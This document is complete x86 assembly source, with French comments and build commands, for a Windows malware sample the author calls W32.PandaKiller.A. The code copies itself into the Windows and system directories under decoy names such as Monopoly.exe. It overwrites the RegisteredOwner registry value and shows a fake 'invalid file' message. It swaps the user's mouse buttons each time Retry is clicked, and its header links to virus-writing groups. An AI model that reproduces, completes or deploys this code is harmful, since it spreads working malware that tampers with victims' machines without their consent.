; comment $
; 
;                    W32.PandaKiller.A par PandaKiller le 12 octobre 2000
; 
; 
; CREER DEUX REPERTOIRE : - C:\PandaKiller
;                         - %windir%\Panda
; 
; S'AUTO-COPIE DANS     : - %windir%\Pandakiller.exe
;                         - %windir%\Panda\Stages.exe
;                         - %system%\Monopoly.exe
; 
; 
; DESCRIPTION:
; 
; Dans C:\PandaKiller, il cr‚e le fichier "EMail.txt" o— il ‚crit une adresse
; EMail o— peut nous contacter ainsi qu'un copyright.
; Il affiche un message et change les bouttons de la souris si on clique
; sur r‚‚ssayer et modifie ‚galement le nom d'enregistrement par PandaKiller
; 
; 
; 
; POUR COMPILER:
; 
; tasm32 /M /ML PandaKiller.asm
; tlink32 -Tpe -x -aa PandaKiller.obj,,,import32
; 
; Lien :  www.coderz.net/matrix
;         www.matrixvx.org
;         www.coderz.net
;         
; 
; $

.386p
locals
jumps
.model flat

extrn CreateDirectoryA:PROC
extrn GetWindowsDirectoryA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetModuleHandleA:PROC
extrn GetModuleFileNameA:PROC
extrn CopyFileA:PROC
extrn CreateFileA:PROC
extrn WriteFile:PROC
extrn CloseHandle:PROC
extrn RegCreateKeyExA:PROC
extrn RegSetValueExA:PROC
extrn RegCloseKey:PROC
extrn lstrcat:PROC
extrn MessageBoxA:PROC
extrn SwapMouseButton:PROC
extrn ExitProcess:PROC

.data
moi     dd 260 dup (0)
targ1   dd 260 dup (0)
targ10  dd 260 dup (0)
fh      dd 0
octets  dd 0
l       dd 0
p       dd 0
CLE     db "\Software\Microsoft\Windows\CurrentVersion",00h
DONNEE  db "PandaKiller",00h
NOM     db "RegisteredOwner",00h

rep1    db "C:\PandaKiller",00h
rep2    db "\Panda",00h
copie1  db "\PandaKiller.exe",00h
copie2  db "\Monopoly.exe",00h
copie3  db "\Panda\Stages.exe",00h
fichier db "\PandaKiller\EMail.txt",00h

TITRE   db "Par PandaKiller le 12/10/00",00h
TEXTE   db "****************************",10,13
        db "Ce fichier n'est pas valide!",10,13
        db "****************************",00h

TXT     db "[PandaKiller]",0dh,0ah
        db "Pour tout contact : Panda34@caramail.com",0dh,0ah
        db "VBS/LoveLetter.A",0dh,0ah
        db "VBS/IE55",0dh,0ah
        db "W32.Happy99",0dh,0ah
        db "I-Worm/Kak.A",0dh,0ah
        db "W32.PandaKiller.A par PandaKiller (c)2000",00h
taille  equ $-TXT

.code

DEBUT:
CREER_REPERTOIRE:
        push 00000000h
        push offset rep1
        call CreateDirectoryA           ;C:\Pandakiller
        push 260
        push offset targ1
        call GetWindowsDirectoryA
        push offset rep2
        push offset targ1
        call lstrcat
        push offset targ1
        call CreateDirectoryA           ;%windir%\Panda


AUTO_COPIE:
        push 00000000h
        call GetModuleHandleA
        push 260
        push offset moi
        push eax
        call GetModuleFileNameA
        push 260
        push offset targ1
        call GetWindowsDirectoryA
        push offset copie1
        push offset targ1
        call lstrcat
        push 00000000h
        push offset targ1
        push offset moi
        call CopyFileA                  ;%windir%\PandaKiller.exe
        push 260
        push offset targ1
        call GetSystemDirectoryA
        push offset copie2
        push offset targ1
        call lstrcat
        push 00000000h
        push offset targ1
        push offset moi
        call CopyFileA                  ;%system%\Monopoly.exe

        push 260
        push offset targ10
        call GetWindowsDirectoryA
        push offset copie3
        push offset targ10
        call lstrcat
        push 00000000h
        push offset targ10
        push offset targ1
        call CopyFileA                  ;%windir%\Panda\Stages.exe


FICHIER_TEXTE:
        push 00000000h
        push 00000080h
        push 00000002h
        push 00000000h
        push 00000001h
        push 40000000h
        push offset fichier
        call CreateFileA
        mov  [fh],eax
        push 00h
        push offset octets
        push taille
        push offset TXT
        push [fh]
        call WriteFile
        push [fh]
        call CloseHandle


REGISTRE:
        push offset p
        push 0
        push 1F0000h + 1 + 2h
        push 0
        push 0
        push 0
        push offset CLE
        push 80000002h                  ;HKEY_LOCAL_MACHINE
        call RegCreateKeyExA
        push 05h
        push offset DONNEE              ;PandaKiller
        push 01h
        push 0
        push offset NOM                 ;DANS RegisteredOwner
        push p
        call RegSetValueExA             ;CREE UN REGISTRE
        push 0
        call RegCloseKey                ;FERME LA BASE DE REGISTRE


MESSAGE:
        push 35h
        push offset TITRE
        push offset TEXTE
        push 00h
        call MessageBoxA
        cmp  eax,4
        jne  FIN



SOURIS: push 01h
        call SwapMouseButton
        jmp  MESSAGE
    
FIN:
        push 0
        call ExitProcess

end DEBUT
